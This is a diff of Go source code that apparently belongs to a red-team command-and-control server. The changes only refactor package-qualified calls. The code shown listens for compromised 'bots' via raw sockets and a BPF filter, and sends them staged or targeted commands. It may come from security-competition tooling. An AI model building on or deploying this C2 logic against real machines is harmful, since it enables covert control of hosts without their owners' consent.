@@ -383,7 +383,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		bot := <-listen
 		// Check if there is a command to run
 		// Make a socket for sending
-		fd := cattails.NewSocket()
+		fd := NewSocket()
 		// Create packet
 		fmt.Println("SRC MAC:", iface.HardwareAddr)
 		fmt.Println("DST MAC:", dstMAC)
@@ -391,13 +391,13 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		fmt.Println("DST IP:", bot.RespIP)
 		if targetcommand != "" {
 			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
-			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+			packet := CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, CreateTargetCommand(targetcommand, targetIP))
+			SendPacket(fd, iface, CreateAddrStruct(iface), packet)
 			fmt.Println("[+] Packet target cmd sent", targetIP, stagedCmd)
 		} else if stagedCmd != "" {
 			fmt.Println("[+] Sending staged cmd", targetIP, stagedCmd)
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
-			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+			packet := CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, CreateCommand(stagedCmd))
+			SendPacket(fd, iface, CreateAddrStruct(iface), packet)
 			fmt.Println("[+] Packet staged cmd sent", targetIP, stagedCmd)
 		} else {
 			fmt.Print("[-] Fuck you no command received")
@@ -509,10 +509,10 @@ func updatepwnBoard(bot Host) {
 func main() {
 
 	// Create a BPF vm for filtering
-	vm := cattails.CreateBPFVM(cattails.FilterRaw)
+	vm := CreateBPFVM(FilterRaw)
 
 	// Create a socket for reading
-	readfd := cattails.NewSocket()
+	readfd := NewSocket()
 	defer unix.Close(readfd)
 
 	fmt.Println("[+] Created sockets")
@@ -521,10 +521,10 @@ func main() {
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := cattails.GetOutwardIface("172.25.2.11:80")
+	iface, myIP := GetOutwardIface("172.25.2.11:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
-	dstMAC, err := cattails.GetRouterMAC()
+	dstMAC, err := GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -539,8 +539,8 @@ func main() {
 
 	// This needs to be on main thread
 	for {
-		// packet := cattails.ServerReadPacket(readfd, vm)
-		packet := cattails.ServerReadPacket(readfd, vm)
+		// packet := ServerReadPacket(readfd, vm)
+		packet := ServerReadPacket(readfd, vm)
 		// Yeet over to processing function
 		if packet != nil {
 			go serverProcessPacket(packet, listen)
